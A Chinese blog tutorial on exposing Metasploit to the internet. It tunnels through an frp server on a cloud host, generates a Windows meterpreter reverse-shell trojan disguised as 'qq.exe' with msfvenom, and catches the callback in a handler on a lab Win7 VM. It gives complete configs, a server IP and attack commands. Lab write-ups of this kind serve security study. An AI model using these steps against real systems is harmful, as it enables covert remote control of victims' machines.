---
legacyHtml: true
legacySymbols: 6230
title: frp 搭建公网 Metasploit
date: "2022-04-18T12:18:36.000Z"
updated: "2025-01-21T06:58:19.687Z"
tags:
  - Trojan horse
  - Linux
  - Kali
  - Metasploit
  - frp
categories:
  - CyberSecurity
  - 木马
cover: >-
  https://res.cloudinary.com/sycamore/image/upload/v1682442126/Typera/2023/04/87d91c5d20cc130aa72fe99c74a9e8c2.png
description: "# 准备 frps 部署机。 要求：拥有 公网 IP （例如 VPS、云服务器等等） 本文选用 Ubuntu 18.04.6 云服务器 frpc 客户机。 要求：能访问互联网 本文选用 Kali Linux 2022 虚拟机 frp 的 Github 项目地址：fatedier/frp # frps（云服务器） # 下载安装 Github 项目 上找到最新的"
---

<h2 id="准备"><a class="anchor" href="#准备">#</a> 准备</h2>
<ul>
<li><strong>frps</strong> 部署机。
<ul>
<li>要求：拥有 <strong>公网 IP</strong> （例如 <strong>VPS</strong>、云服务器等等）</li>
<li>本文选用 <strong>Ubuntu 18.04.6</strong> 云服务器</li>
</ul>
</li>
<li><strong>frpc</strong> 客户机。
<ul>
<li>要求：能访问互联网</li>
<li>本文选用 <strong>Kali Linux 2022</strong> 虚拟机</li>
</ul>
</li>
<li><strong>frp</strong> 的 <strong>Github</strong> 项目地址：<a href="https://github.com/fatedier/frp">fatedier/frp</a></li>
</ul>
<h2 id="frps云服务器"><a class="anchor" href="#frps云服务器">#</a> frps（云服务器）</h2>
<h3 id="下载安装"><a class="anchor" href="#下载安装">#</a> 下载安装</h3>
<p><a href="https://github.com/fatedier/frp"><strong>Github</strong> 项目</a> 上找到最新的 <a href="https://github.com/fatedier/frp/releases">releases</a> ：<br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682442796/Typera/2023/04/65c0edabf7c4cf7b431c9f10ff94bc05.png" alt="image-20230426011312770" /></p>
<ol>
<li>在 <strong>云服务器</strong> 终端上下载： <code>wget https://github.com/fatedier/frp/releases/download/v0.41.0/frp_0.41.0_linux_amd64.tar.gz</code> <br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682442806/Typera/2023/04/d8b546285137f60d42fef4a27a06d821.png" alt="image-20230426011322302" /></li>
<li><strong>解压缩</strong> 下载的文件： <code>tar -zxvf frp_0.41.0_linux_amd64.tar.gz</code> <br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682442811/Typera/2023/04/4063a698f14734b0fb54a92974122ba5.png" alt="image-20230426011327257" /></li>
<li><strong>进入</strong> 解压缩的文件夹： <code>cd frp_0.41.0_linux_amd64/</code></li>
<li>因为配置的是 <strong>frps</strong> ，可以 <strong>删除</strong> 文件夹内的 <strong>frpc</strong> 相关文件，防止后续修改出错：<strong> <code>rm -rf frpc*</code> </strong><br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682442816/Typera/2023/04/f776553aeca109b5eef6a7e0d3d6bacd.png" alt="image-20230426011332064" /></li>
</ol>
<h3 id="编写-frps-配置文件"><a class="anchor" href="#编写-frps-配置文件">#</a> 编写 frps 配置文件</h3>
<p><code>vim frps.ini</code> <br />
 内容如下：<br />
（不想要<strong>监控页面</strong>的话，删除对应配置所在 <strong>行</strong> 即可）</p>
<pre><code>[common]
bind_port = 7777          # frps和frpc的通讯端口
dashboard_port = 9999     # web监控页面的端口
dashboard_user = Sycamore # 登录监控页面的用户名
dashboard_pwd = 123456    # 登录监控页面的密码
</code></pre>
<p>如图所示：<br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682442822/Typera/2023/04/02f8cca9459920e2f031c95fec4c172e.png" alt="image-20230426011338410" /><br />
（需要 <strong>云服务器</strong> 打开 <strong>对应端口</strong>：7777、9999)</p>
<h3 id="运行"><a class="anchor" href="#运行">#</a> 运行</h3>
<p>相关命令 <strong>基本上</strong> 应当在 <strong>frp_0.41.0_linux_amd64 文件夹</strong> 下执行～</p>
<ul>
<li>命令行输入： <code>./frps -c frps.ini</code>
<ul>
<li><strong>[注意]</strong>：关闭命令行窗口，或是停止执行该命令，就会 <strong>退出</strong></li>
</ul>
</li>
<li>后台运行： <code>nohup ./frps -c frps.ini &gt;/dev/null 2&gt;&amp;1 &amp;</code>
<ul>
<li>因为通常不会 <strong>关闭云服务器</strong>，所以 <strong>后台运行</strong> 就足够了；</li>
<li>当然也可以 <strong>开启自启动</strong>，详情见 <strong>frpc</strong> 的内容，对应命令改个符号就行～</li>
</ul>
</li>
</ul>
<h2 id="frpckali-虚拟机"><a class="anchor" href="#frpckali-虚拟机">#</a> frpc（Kali 虚拟机）</h2>
<p><img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682442827/Typera/2023/04/692976286e5ddec8cd744326a1c3a54d.png" alt="image-20230426011342973" /></p>
<h3 id="下载安装-2"><a class="anchor" href="#下载安装-2">#</a> 下载安装</h3>
<p><a href="https://github.com/fatedier/frp"><strong>Github</strong> 项目</a> 上找到最新的 <a href="https://github.com/fatedier/frp/releases">releases</a></p>
<p>步骤与 <strong>frps</strong> 的几乎<strong>相同</strong>，<strong>区别</strong> 是：</p>
<ul>
<li>对象变成了 <strong>Kali 虚拟机</strong>，而不是 云服务器</li>
<li>以及最后一步 <strong>删除的是 frps</strong>：<br />
4. 因为配置的是 <strong>frpc</strong> ，可以 <strong>删除</strong> 文件夹内的 <strong>frps</strong> 相关文件，防止后续修改出错：<strong> <code>rm -rf frps*</code> </strong></li>
</ul>
<h3 id="编写-frpc-配置文件"><a class="anchor" href="#编写-frpc-配置文件">#</a> 编写 frpc 配置文件</h3>
<p>作为一款 <strong>内网穿透</strong> 工具，<strong>frp</strong> 穿透了内网之后，还需要使用 <strong>其他手段</strong>（<strong>ssh</strong>）<br />
和外网建立交互，所以 <strong>配置文件</strong> 中会存在 <strong>[ssh]</strong> 配置。</p>
<p><code>vim frpc.ini</code> <br />
 内容如下：</p>
<pre><code>[common]
server_addr = 106.15.52.194
server_port = 7777

[ssh]
type = tcp
local_ip = 127.0.0.1
local_port = 22
remote_port = 6666
use_compression = true
</code></pre>

<p>相关 <strong>解释</strong> 如图：<br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682442834/Typera/2023/04/2144e375ff1aca162bb41868d050259f.png" alt="image-20230426011350366" /></p>
<h3 id="运行-2"><a class="anchor" href="#运行-2">#</a> 运行</h3>
<p>相关命令 <strong>基本上</strong> 应当在 <strong>frp_0.41.0_linux_amd64 文件夹</strong> 下执行～</p>
<ul>
<li>命令行输入： <code>./frpc -c frpc.ini</code>
<ul>
<li><strong>[注意]</strong>：关闭命令行窗口，或是停止执行该命令，就会 <strong>退出</strong></li>
</ul>
</li>
<li>开机自启动：
<ul>
<li>服务目录 <strong>新建并编辑</strong> 文件： <code>vim /lib/systemd/system/frp.service</code></li>
<li>填入以下内容：<pre><code>[Unit]
Description=Frp Client Service
After=network.target remote-fs.target nss-lookup.target
Wants=network.target

[Service]
Type=simple
ExecStart=/root/frp/frpc -c /root/frp/frpc.ini
Restart=always
RestartSec=20s

[Install]
WantedBy=multi-user.target
</code></pre>

</li>
<li>启动 <strong>frpc</strong> 服务： <code>systemctl start frp</code> <br />
（最后的  <code>frp</code>  名称取决于上一步新建的文件名  <code>frp.service</code> ）</li>
<li>打开 <strong>frpc</strong> 服务自启动  <code>systemctl enable frp</code> <br />
<strong> [注意]：</strong>
<ul>
<li>如果要重启应用： <code>systemctl restart frp</code></li>
<li>如果要停止应用： <code>systemctl stop frp</code></li>
<li>如果要查看 <strong>frpc</strong> 的日志： <code>systemctl status frp</code></li>
<li>权限不够，记得加  <code>sudo</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>服务文件</strong> 重要内容注释 如下图：<br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682442841/Typera/2023/04/6e79855b87a38703bd5b740419dc6e65.png" alt="image-20230426011356634" /></p>
<h2 id="ssh-连接测试"><a class="anchor" href="#ssh-连接测试">#</a> SSH 连接测试</h2>
<ul>
<li>命令行  <code>ssh root@x.x.x.x -p 6666</code> <br />
（<strong>root</strong> 用户登录到 <strong>云服务器 x.x.x.x</strong> 的 <strong>6666</strong> 端口）<br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682442846/Typera/2023/04/52501488b9125c9518e2190783a8fcf4.png" alt="" /></li>
<li>Xshell 创建新会话，具体内容如下：<br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682442854/Typera/2023/04/891e33c279efacbf48adee134034f971.png" alt="image-20230426011410382" /><img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682442861/Typera/2023/04/fe85e7d6d6e0e5955c77ff87a4ea5abe.png" alt="image-20230426011417120" /><br />
&lt;br&gt;<br />
<strong>Xshell  连接成功</strong>：<br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682442869/Typera/2023/04/7eed7e40069de144ddcfb74725077325.png" alt="image-20230426011424294" /></li>
</ul>
<h2 id="msf-渗透攻击测试"><a class="anchor" href="#msf-渗透攻击测试">#</a> msf 渗透攻击测试</h2>
<p>双击打开 刚刚建立的 <strong>Xshell 新会话</strong>（ frp ）.</p>
<h3 id="frpc-添加新配置"><a class="anchor" href="#frpc-添加新配置">#</a> frpc 添加新配置</h3>
<p>输入命令： <code>vim frpc.ini</code> ，编辑 <strong>frpc</strong> 配制文件，<br />
在文件末尾 <strong>添加</strong>：</p>
<pre><code>[msf]
type = tcp
local_ip = 127.0.0.1
local_port = 4444
remote_port = 2333 
</code></pre>
<p>配置内容的 <strong>含义</strong> 与 <strong>[ssh]</strong> 类似，解释如图：<br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682442874/Typera/2023/04/75402a4aa7e5b6970ffb51313c0a847f.png" alt="image-20230426011431000" /></p>
<h3 id="msf-生成木马"><a class="anchor" href="#msf-生成木马">#</a> msf 生成木马</h3>
<p>与连接 <strong>本地的 shell</strong> 生成木马不同，<br />
因为我们要使用 <strong>frp 穿透内网</strong> 连接的 shell ，去 <strong>监听木马反弹</strong>的 shell，<br />
所以我们 <strong>生成木马</strong> 时，设置的 LHOST、LPORT 应当是 <strong>云服务器</strong> 的对应数据。<br />
（直接用内网测试的时候，LHOST、LPORT 填的是 <strong>本地虚拟机</strong> 的相关数据）</p>
<p>用 <strong>msf</strong> 生成 <strong>windows</strong> 系统的 <strong>反向 shell</strong> 木马：<br />
 <code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=2333 -f exe &gt; qq.exe</code> <br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682442881/Typera/2023/04/f72e4363a982738b25b5976722ab8948.png" alt="image-20230426011437323" /><br />
 成功生成木马文件：<strong>qq.exe</strong></p>
<h3 id="msf-监听反弹的-shell"><a class="anchor" href="#msf-监听反弹的-shell">#</a> msf 监听反弹的 shell</h3>
<blockquote>
<p>（确定 frps 、frpc 服务均已在后台运行）<br />
（事先上传 qq.exe 到测试的靶机，本文用 	Win7_x64 虚拟机替代）</p>
</blockquote>
<blockquote>
<p>关于<strong>上传</strong>：Kali 虚拟机 开启 <strong>Apache2</strong> 服务，Win7_x64 虚拟机 内网访问下载：<br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682442886/Typera/2023/04/79c8bcdd330dc38041cee9fa333d9bb8.png" alt="" /></p>
</blockquote>
<ol>
<li><code>msfconsole</code>
<ul>
<li>打开 <strong>msf</strong></li>
</ul>
</li>
<li><code>use exploit/multi/handler</code>
<ul>
<li>选择使用的 exploit</li>
</ul>
</li>
<li><code>set PAYLOAD windows/x64/meterpreter/reverse_tcp</code>
<ul>
<li>设置 PAYLOAD （生成木马时使用的）</li>
</ul>
</li>
<li><code>set LHOST 127.0.0.1</code>
<ul>
<li>设置 LHOST 为本地 IP</li>
</ul>
</li>
<li><code>set LPORT 4444</code>
<ul>
<li>设置 LPORT 为转发的本地端口 4444</li>
</ul>
</li>
<li>run
<ul>
<li>开始监听</li>
</ul>
</li>
</ol>
<blockquote>
<p>（先让 <strong>msf</strong> 开始监听，再双击运行上传的木马文件）</p>
</blockquote>
<p>演示如图所示：</p>
<ul>
<li>双击 <strong>运行木马</strong>：<br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682442892/Typera/2023/04/553d087d53826c0f6f0bc2edf848b2b0.png" alt="image-20230426011447735" /><br />
&lt;br&gt;</li>
<li>msf <strong>开始监听</strong> &amp; 成功获得 meterpreter <strong>shell</strong>：<br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682442902/Typera/2023/04/204ea56873200eb9b2507252955adb2a.png" alt="image-20230426011457351" /></li>
</ul>
